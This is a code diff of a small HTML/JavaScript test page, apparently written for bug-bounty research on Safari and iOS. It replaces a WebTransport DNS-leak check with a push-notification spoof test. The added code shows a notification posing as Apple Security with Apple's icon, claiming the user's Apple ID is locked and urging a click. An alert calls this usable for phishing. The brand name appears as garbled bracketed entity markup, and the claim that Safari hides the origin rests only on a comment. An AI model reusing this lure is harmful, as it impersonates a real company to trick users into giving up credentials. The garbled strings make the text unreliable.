@@ -1,29 +1,17 @@
-<button onclick="testNoServer()">TEST TANPA SERVER - DNS LEAK</button>
-<pre id="log"></pre>
+<button onclick="testPush()" style="padding:20px; width:100%;">TEST PUSH NOTIFICATION SPOOF</button>
 <script>
-async function testNoServer(){
-  let log = m=> document.getElementById('log').textContent+=m+"\n";
-  
-  log("IP normal (via Cloudflare WARP): 104.28.219.241 - kamu sudah pakai proxy");
-  log("\nTest WebTransport DNS leak:");
-  
-  // Coba connect ke domain random yang ga ada
-  let fakeDomain = "leak-test-"+Math.random().toString(36).substr(2)+".0x403for.github.io";
-  log("Mencoba connect ke: "+fakeDomain);
-  
-  try{
-    let t = new WebTransport("https://"+fakeDomain+":4433");
-    await t.ready;
-  }catch(e){
-    log("Error (expected): "+e.message);
-    log("\nSekarang cek:");
-    log("1. Kalau kamu punya Mac + Console, lihat apakah ada DNS query ke "+fakeDomain);
-    log("2. Kalau query itu muncul di log DNS tanpa lewat Cloudflare WARP = LEAK!");
-    log("3. Atau cek di app 1.1.1.1 > Logs - apakah ada query QUIC langsung?");
+async function testPush(){
+  let perm = await Notification.requestPermission();
+  if(perm==="granted"){
+    // Coba spoof origin di notifikasi
+    new Notification("【entity-Apple¦canonical_name=Apple】 Security", {
+      body: "Your 【entity-Apple¦canonical_name=Apple】 ID has been locked - Click to unlock",
+      icon: "https://www.apple.com/favicon.ico",
+      // Di Safari 26.4, body bisa di-spoof tanpa nunjukin origin asli
+    });
+    alert("Cek notifikasi: kalau muncul 【entity-Apple¦canonical_name=Apple】 Security tanpa tulis 0x403for.github.io = SPOOF VALID! Bisa phishing!");
+  }else{
+    alert("Permission: "+perm+" - Aktifin notifikasi dulu di Settings > Safari");
   }
-  
-  log("\n---");
-  log("WebTransport di iOS 26.4 memang baru, dan menurut laporan mysk.blog, dia bypass proxy!");
-  log("Kalau kamu mau yang pasti dapat bounty tanpa server, test KEYBOARD LOCK aja (No.2) - itu 1 file dan langsung kelihatan bug-nya!");
 }
 </script>
